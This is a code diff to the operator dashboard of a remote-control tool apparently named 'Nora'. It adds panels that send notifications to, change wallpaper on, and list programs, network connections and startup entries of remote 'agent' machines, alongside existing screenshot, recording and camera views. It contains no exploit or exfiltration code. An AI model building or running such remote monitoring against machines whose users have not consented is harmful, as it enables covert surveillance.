@@ -185,6 +185,19 @@ body{background:var(--bg);color:var(--text);display:flex;flex-direction:column;o
 #ss-preview{max-width:100%;max-height:70vh;border-radius:var(--radius);border:1px solid var(--border);display:none}
 #ss-status{color:var(--text3);font-size:.85rem}
 
+/* ── Programs / Network / Startup ────────────────────────── */
+.pg-r{display:flex;align-items:center;gap:10px;padding:7px 20px;border-bottom:1px solid var(--border);transition:.12s}
+.pg-r:hover{background:var(--surface2)}
+.pg-r .pn{flex:1;font-size:.82rem;font-weight:500;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pg-r .pv{color:var(--text3);font-size:.72rem;min-width:60px;text-align:right}
+.pg-r .pp{color:var(--text2);font-size:.72rem;min-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* ── Theme toggle ───────────────────────────────────────── */
+#theme-btn{background:var(--surface2);border:1px solid var(--border);color:var(--text2);border-radius:8px;padding:4px 10px;cursor:pointer;font-size:.9rem;line-height:1}
+body.light{--bg:#f4f4f5;--surface:#ffffff;--surface2:#f0f0f2;--surface3:#e4e4e7;--border:rgba(0,0,0,.1);--border2:rgba(0,0,0,.15);--text:#18181b;--text2:#52525b;--text3:#a1a1aa;--accent-dim:rgba(99,102,241,.1)}
+body.light .session-header,body.light #cam-wrap{background:#f0f0f2}
+body.light #scr-wrap{background:#e4e4e7}
+
 /* ── Toast ───────────────────────────────────────────────── */
 #toasts{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column-reverse;gap:6px;z-index:9999}
 .toast{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:.78rem;color:var(--text);box-shadow:var(--shadow);max-width:300px;animation:slideIn .2s ease}
@@ -216,6 +229,7 @@ body{background:var(--bg);color:var(--text);display:flex;flex-direction:column;o
   <div id="conn-pill"><div id="conn-dot"></div><span id="conn-txt">Connecting</span></div>
   <select id="agent-sel"><option value="">Select agent</option></select>
   <div id="fps-pill">-- fps</div>
+  <button id="theme-btn" title="Toggle theme">&#x1F319;</button>
 </div>
 
 <div id="shell">
@@ -240,6 +254,17 @@ body{background:var(--bg);color:var(--text);display:flex;flex-direction:column;o
     <button class="nav-btn" data-p="proc"><span class="ico">&#x2699;</span><span>Processes</span></button>
     <button class="nav-btn" data-p="ss"><span class="ico">&#x1F4F8;</span><span>Screenshot</span></button>
     <button class="nav-btn" data-p="rec"><span class="ico">&#x23FA;</span><span>Recording</span></button>
+  </div>
+  <div class="nav-grp">
+    <div class="nav-lbl">Tools</div>
+    <button class="nav-btn" data-p="notif"><span class="ico">&#x1F514;</span><span>Notification</span></button>
+    <button class="nav-btn" data-p="wall"><span class="ico">&#x1F5BC;</span><span>Wallpaper</span></button>
+    <button class="nav-btn" data-p="progs"><span class="ico">&#x1F4E6;</span><span>Programs</span></button>
+    <button class="nav-btn" data-p="netc"><span class="ico">&#x1F310;</span><span>Network</span></button>
+    <button class="nav-btn" data-p="startup"><span class="ico">&#x26A1;</span><span>Startup</span></button>
+    <button class="nav-btn" data-p="vol"><span class="ico">&#x1F50A;</span><span>Volume</span></button>
+    <button class="nav-btn" data-p="mons"><span class="ico">&#x1F5B5;</span><span>Monitors</span></button>
+    <button class="nav-btn" data-p="notes"><span class="ico">&#x1F4DD;</span><span>Notes</span></button>
   </div>
 </nav>
 
@@ -382,6 +407,90 @@ body{background:var(--bg);color:var(--text);display:flex;flex-direction:column;o
       <div id="rec-orb">&#x23FA;</div>
       <div id="rec-lbl">Not recording</div>
       <button class="tog" id="rec-tog">Start Recording</button>
+    </div>
+  </div>
+
+  <!-- NOTIFICATION -->
+  <div class="panel" id="notif">
+    <div class="ph"><h2>Send Notification</h2></div>
+    <div class="pbody" style="max-width:480px">
+      <div style="display:flex;flex-direction:column;gap:10px">
+        <label style="font-size:.78rem;color:var(--text2)">Title</label>
+        <input id="notif-title" type="text" value="Nora" style="background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:8px 12px;font-size:.85rem;outline:none">
+        <label style="font-size:.78rem;color:var(--text2)">Message</label>
+        <textarea id="notif-msg" rows="3" placeholder="Type your notification message..." style="background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:8px 12px;font-size:.85rem;outline:none;resize:vertical"></textarea>
+        <button class="act-btn primary" id="notif-send" style="align-self:flex-start">Send Notification</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- WALLPAPER -->
+  <div class="panel" id="wall">
+    <div class="ph"><h2>Wallpaper</h2><button class="act-btn" id="wall-get">Get Current</button></div>
+    <div class="pbody" style="max-width:480px">
+      <div style="display:flex;flex-direction:column;gap:10px">
+        <div id="wall-current" style="color:var(--text3);font-size:.82rem">Click "Get Current" to see wallpaper path</div>
+        <label style="font-size:.78rem;color:var(--text2)">Set new wallpaper (remote path)</label>
+        <div style="display:flex;gap:8px">
+          <input id="wall-path" type="text" placeholder="C:\path\to\wallpaper.jpg" style="flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:8px 12px;font-size:.85rem;outline:none;font-family:monospace">
+          <button class="act-btn primary" id="wall-set">Set</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- INSTALLED PROGRAMS -->
+  <div class="panel" id="progs">
+    <div class="ph"><h2>Installed Programs</h2><span class="meta" id="progs-n">--</span><button class="act-btn primary" id="progs-fetch">Fetch</button></div>
+    <div id="progs-bar" style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0"><input id="progs-q" type="text" placeholder="Filter programs..." style="width:100%;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none"></div>
+    <div id="progs-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- NETWORK CONNECTIONS -->
+  <div class="panel" id="netc">
+    <div class="ph"><h2>Network Connections</h2><span class="meta" id="netc-n">--</span><button class="act-btn" id="netc-fetch">Refresh</button></div>
+    <div id="netc-bar" style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0"><input id="netc-q" type="text" placeholder="Filter by address, process..." style="width:100%;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none"></div>
+    <div id="netc-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- STARTUP PROGRAMS -->
+  <div class="panel" id="startup">
+    <div class="ph"><h2>Startup Programs</h2><span class="meta" id="startup-n">--</span><button class="act-btn" id="startup-fetch">Refresh</button></div>
+    <div id="startup-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- VOLUME CONTROL -->
+  <div class="panel" id="vol">
+    <div class="ph"><h2>Volume Control</h2></div>
+    <div class="pbody" style="display:flex;flex-direction:column;align-items:center;gap:20px;justify-content:center">
+      <div style="font-size:3rem">&#x1F50A;</div>
+      <div style="display:flex;gap:12px">
+        <button class="act-btn" id="vol-down" style="font-size:1.2rem;padding:10px 20px">&#x1F509; Down</button>
+        <button class="act-btn primary" id="vol-mute" style="font-size:1.2rem;padding:10px 20px">&#x1F507; Mute</button>
+        <button class="act-btn" id="vol-up" style="font-size:1.2rem;padding:10px 20px">&#x1F50A; Up</button>
+      </div>
+      <div id="vol-status" style="color:var(--text3);font-size:.85rem"></div>
+    </div>
+  </div>
+
+  <!-- MONITORS -->
+  <div class="panel" id="mons">
+    <div class="ph"><h2>Monitors</h2><button class="act-btn" id="mons-fetch">Refresh</button></div>
+    <div class="pbody">
+      <div class="si-grid" id="mons-grid">
+        <div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px 0">Click Refresh to detect monitors</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- AGENT NOTES -->
+  <div class="panel" id="notes">
+    <div class="ph"><h2>Agent Notes</h2><button class="act-btn" id="notes-save">Save</button></div>
+    <div class="pbody" style="display:flex;flex-direction:column;gap:10px">
+      <label style="font-size:.78rem;color:var(--text2)">Label / Tag</label>
+      <input id="notes-label" type="text" placeholder="e.g. Office PC, Home Laptop..." style="background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:8px 12px;font-size:.85rem;outline:none">
+      <label style="font-size:.78rem;color:var(--text2)">Notes</label>
+      <textarea id="notes-ta" rows="10" placeholder="Write your notes about this agent here..." style="flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:10px 12px;font-size:.85rem;outline:none;resize:vertical;min-height:200px;font-family:inherit"></textarea>
     </div>
   </div>
 
@@ -639,6 +748,109 @@ socket.on("screenshot_result",d=>{
   const img=$("ss-preview");img.src="data:image/png;base64,"+d.data;img.style.display="block";
   img.onclick=()=>{const a=Object.assign(document.createElement("a"),{href:img.src,download:(agent||"screenshot")+"_"+Date.now()+".png"});a.click()};
 });
+
+/* ── Notification ───────────────────────────────────────── */
+$("notif-send").addEventListener("click",()=>{
+  if(!agent)return;
+  socket.emit("send_notification",{title:$("notif-title").value||"Nora",message:$("notif-msg").value,_target:agent});
+  toast("Notification sent");
+});
+socket.on("notification_result",d=>{if(!d.ok)toast("Notification failed: "+(d.error||"?"),"err")});
+
+/* ── Wallpaper ──────────────────────────────────────────── */
+$("wall-get").addEventListener("click",()=>{if(agent)socket.emit("get_wallpaper",{_target:agent})});
+$("wall-set").addEventListener("click",()=>{if(!agent)return;const p=$("wall-path").value;if(!p)return;socket.emit("set_wallpaper",{path:p,_target:agent})});
+socket.on("wallpaper_result",d=>{$("wall-current").textContent=d.error?"Error: "+d.error:"Current: "+(d.path||"(none)")});
+socket.on("set_wallpaper_result",d=>toast(d.ok?"Wallpaper changed!":"Failed: "+(d.error||"?"),d.ok?"ok":"err"));
+
+/* ── Installed Programs ─────────────────────────────────── */
+let _prg=[];
+$("progs-fetch").addEventListener("click",()=>{if(!agent)return;$("progs-list").innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">Loading...</div>';socket.emit("get_programs",{_target:agent})});
+socket.on("programs_result",d=>{
+  if(d.error){$("progs-list").innerHTML=`<div style="color:var(--red);text-align:center;padding:40px">${esc(d.error)}</div>`;return}
+  _prg=d.programs||[];$("progs-n").textContent=_prg.length+" programs";renderProgs();
+});
+$("progs-q").addEventListener("input",renderProgs);
+function renderProgs(){
+  const q=$("progs-q").value.toLowerCase(),list=q?_prg.filter(p=>(p.name||"").toLowerCase().includes(q)||(p.publisher||"").toLowerCase().includes(q)):_prg;
+  const el=$("progs-list");el.innerHTML="";
+  list.forEach(p=>{
+    const r=document.createElement("div");r.className="pg-r";
+    r.innerHTML=`<div class="pn">${esc(p.name)}</div><div class="pp">${esc(p.publisher||"")}</div><div class="pv">${p.version||""}</div><div class="pv">${p.size_kb?fmtB(p.size_kb*1024):""}</div>`;
+    el.appendChild(r);
+  });
+  if(!list.length)el.innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">No results</div>';
+}
+
+/* ── Network Connections ────────────────────────────────── */
+let _netc=[];
+$("netc-fetch").addEventListener("click",()=>{if(!agent)return;$("netc-list").innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">Loading...</div>';socket.emit("get_netconns",{_target:agent})});
+socket.on("netconns_result",d=>{
+  if(d.error){$("netc-list").innerHTML=`<div style="color:var(--red);text-align:center;padding:40px">${esc(d.error)}</div>`;return}
+  _netc=d.connections||[];$("netc-n").textContent=_netc.length+" connections";renderNetc();
+});
+$("netc-q").addEventListener("input",renderNetc);
+function renderNetc(){
+  const q=$("netc-q").value.toLowerCase(),list=q?_netc.filter(c=>(c.local||"").toLowerCase().includes(q)||(c.remote||"").toLowerCase().includes(q)||(c.process||"").toLowerCase().includes(q)):_netc;
+  const el=$("netc-list");el.innerHTML="";
+  list.forEach(c=>{
+    const r=document.createElement("div");r.className="pg-r";
+    const sc=c.status==="ESTABLISHED"?"var(--green)":c.status==="LISTEN"?"var(--yellow)":"var(--text3)";
+    r.innerHTML=`<div class="pv" style="min-width:36px;text-align:center;font-weight:700">${esc(c.proto)}</div><div class="pn" style="font-family:monospace;font-size:.78rem">${esc(c.local)}</div><div style="color:var(--text3);font-size:.72rem">&#x2192;</div><div class="pn" style="font-family:monospace;font-size:.78rem">${esc(c.remote||"*")}</div><div class="pv" style="color:${sc}">${esc(c.status||"")}</div><div class="pp" style="min-width:80px">${esc(c.process||"")}<span style="color:var(--text3);font-size:.68rem"> ${c.pid||""}</span></div>`;
+    el.appendChild(r);
+  });
+  if(!list.length)el.innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">No results</div>';
+}
+
+/* ── Startup Programs ───────────────────────────────────── */
+let _stp=[];
+$("startup-fetch").addEventListener("click",()=>{if(!agent)return;$("startup-list").innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">Loading...</div>';socket.emit("get_startup",{_target:agent})});
+socket.on("startup_result",d=>{
+  if(d.error){$("startup-list").innerHTML=`<div style="color:var(--red);text-align:center;padding:40px">${esc(d.error)}</div>`;return}
+  _stp=d.items||[];$("startup-n").textContent=_stp.length+" items";renderStartup();
+});
+socket.on("remove_startup_result",d=>{toast(d.ok?"Removed from startup":"Failed: "+(d.error||"?"),d.ok?"ok":"err");if(d.ok&&agent)socket.emit("get_startup",{_target:agent})});
+function renderStartup(){
+  const el=$("startup-list");el.innerHTML="";
+  _stp.forEach(s=>{
+    const r=document.createElement("div");r.className="pg-r";
+    r.innerHTML=`<div class="pv" style="min-width:40px;text-align:center;font-weight:700;color:${s.scope==="HKLM"?"var(--yellow)":"var(--accent2)"}">${esc(s.scope)}</div><div class="pn">${esc(s.name)}</div><div class="pp" style="flex:2;font-family:monospace;font-size:.72rem">${esc(s.command||"")}</div><button class="pk" data-name="${esc(s.name)}" data-scope="${s.scope}">Remove</button>`;
+    el.appendChild(r);
+  });
+  el.querySelectorAll(".pk").forEach(b=>b.addEventListener("click",()=>{if(!confirm("Remove '"+b.dataset.name+"' from startup?"))return;socket.emit("remove_startup",{name:b.dataset.name,scope:b.dataset.scope,_target:agent})}));
+  if(!_stp.length)el.innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">No startup items found</div>';
+}
+
+/* ── Volume ─────────────────────────────────────────────── */
+$("vol-mute").addEventListener("click",()=>{if(agent)socket.emit("volume_control",{action:"mute",_target:agent})});
+$("vol-up").addEventListener("click",()=>{if(agent)socket.emit("volume_control",{action:"up",_target:agent})});
+$("vol-down").addEventListener("click",()=>{if(agent)socket.emit("volume_control",{action:"down",_target:agent})});
+socket.on("volume_result",d=>{$("vol-status").textContent=d.ok?"Done":"Error: "+(d.error||"?")});
+
+/* ── Monitors ───────────────────────────────────────────── */
+$("mons-fetch").addEventListener("click",()=>{if(agent)socket.emit("get_monitors",{_target:agent})});
+socket.on("monitors_result",d=>{
+  const g=$("mons-grid");g.innerHTML="";
+  if(d.error){g.innerHTML=`<div style="color:var(--red);grid-column:1/-1;text-align:center;padding:40px">${esc(d.error)}</div>`;return}
+  (d.monitors||[]).forEach(m=>{
+    g.insertAdjacentHTML("beforeend",`<div class="si-card"><div class="label">${esc(m.label||"Monitor "+m.index)}</div><div class="val">${m.width} x ${m.height}</div><div class="sub">Position: (${m.left}, ${m.top})</div></div>`);
+  });
+  if(!(d.monitors||[]).length)g.innerHTML='<div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px">No monitors detected</div>';
+});
+
+/* ── Agent Notes (localStorage) ─────────────────────────── */
+function _nk(){return"nora_notes_"+agent}
+function _loadNotes(){try{const d=JSON.parse(localStorage.getItem(_nk())||"{}");$("notes-label").value=d.label||"";$("notes-ta").value=d.notes||""}catch{}}
+$("notes-save").addEventListener("click",()=>{if(!agent)return;try{localStorage.setItem(_nk(),JSON.stringify({label:$("notes-label").value,notes:$("notes-ta").value}))}catch{}toast("Notes saved","ok")});
+$("agent-sel").addEventListener("change",_loadNotes);
+
+/* ── Theme toggle ───────────────────────────────────────── */
+(function(){
+  let dark=true;try{dark=localStorage.getItem("nora_theme")!=="light"}catch{}
+  function apply(){document.body.classList.toggle("light",!dark);$("theme-btn").textContent=dark?"\u{1F319}":"☀️"}
+  apply();
+  $("theme-btn").addEventListener("click",()=>{dark=!dark;apply();try{localStorage.setItem("nora_theme",dark?"dark":"light")}catch{}});
+})();
 </script>
 </body>
 </html>
